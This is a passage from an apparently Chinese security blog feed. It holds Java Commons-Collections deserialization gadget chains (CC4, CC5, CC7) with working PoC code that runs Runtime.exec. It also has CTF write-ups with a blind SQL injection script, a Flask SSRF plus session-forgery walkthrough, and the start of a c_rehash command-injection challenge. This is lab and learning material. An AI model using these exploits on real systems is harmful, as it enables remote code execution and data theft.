com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span></span><br><span class="line"><span class="comment">//        name.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        name.set(templates, &quot;n4c1&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;));</span></span><br><span class="line"><span class="comment">//        byte[][] codes=&#123;code&#125;;</span></span><br><span class="line"><span class="comment">//        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span></span><br><span class="line"><span class="comment">//        bytecodes.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        bytecodes.set(templates, codes);</span></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        // templates.newTransformer();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers=new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));</span></span><br><span class="line"><span class="comment">//        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(1);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(2);</span></span><br><span class="line"><span class="comment">//        Field transformer = TransformingComparator.class.getDeclaredField(&quot;transformer&quot;);</span></span><br><span class="line"><span class="comment">//        transformer.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        transformer.set(transformingComparator, chainedTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;CC4.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC4.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520204438735.png" alt="image-20240520204438735"></p><p>完美运行</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2与CC4不同的地方就是后半些许不同，没有用chainedtrainsform，直接用invokertransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>偷个懒</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5实际上是在CC6的基础上做出了一点点的修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>不同之处在于CC6中的AnnotationInvocationHandler换成了BadAttributeValueExpException这个类</p><p>这里调用了toString方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520223614259.png" alt="image-20240520223614259"></p><p>转到TiedMapEntry类, 它的toString方法中调用了getValue, 这和之前的链子就串联起来了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520224014621.png" alt="image-20240520224014621"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;CC5.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC5.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520232836551.png" alt="image-20240520232836551"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7也是CC6的改造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Payload method chain:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    java.util.Hashtable.readObject</span></span><br><span class="line"><span class="comment">    java.util.Hashtable.reconstitutionPut</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span></span><br><span class="line"><span class="comment">    java.util.AbstractMap.equals</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.LazyMap.get</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.ChainedTransformer.transform</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.InvokerTransformer.transform</span></span><br><span class="line"><span class="comment">    java.lang.reflect.Method.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke0</span></span><br><span class="line"><span class="comment">    java.lang.Runtime.exec</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC1&quot;&gt;&lt;a href=&quot;#CC1&quot; class=&quot;headerlink&quot; title=&quot;CC1&quot;&gt;&lt;/a&gt;CC1&lt;/h1&gt;&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>一些题目</title>
    <link href="http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <id>http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</id>
    <published>2024-03-12T15:53:55.000Z</published>
    <updated>2024-03-15T07:54:18.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>比较简单的bool注入,过滤了空格和&#x2F;**&#x2F;</p><p>这里无表名列名, 之前的无表名列名的注入手法都没成功</p><p>没想到猜了一手flag表flag列就出了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_of_true = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://2b63de0f-491e-44ef-b06a-923f11aee2a8.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">sql = <span class="string">&quot;(select(flag)from(flag))&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(&quot;</span> + sql +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312234910906.png" alt="image-20240312234910906"></p><p>比较坑的点是sql语句必须要括号包裹</p><h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的一题, 之前做过类似的</p><p>读MAC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read?url=local_file:///sys/class/net/eth0/address</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28201</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753; session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtOXZkQT09In1mUS5l7zFyQS64asbFTzEdi+wVkx5S0Cc4YzZOYVk=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:de:d1</span><br><span class="line">0242ac02ded1</span><br></pre></td></tr></table></figure><p>python2下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02ded1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"><span class="comment">#输出 175.043938323</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013527918.png" alt="image-20240312013527918"></p><p>flask session伪造</p><p>读取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013549292.png" alt="image-20240312013549292"></p><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>题目被标记了CVE-2022-1292, 直接开搜</p><p><a href="https://xz.aliyun.com/t/11703">https://xz.aliyun.com/t/11703</a></p><p>利用也非常的简单, 在crt证书的文件名中包含反引号包裹的shell命令, 之后使用c_rehash创建符号链接时, 包裹的命令就会被执行</p><p>题目给出了附件, 先看flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 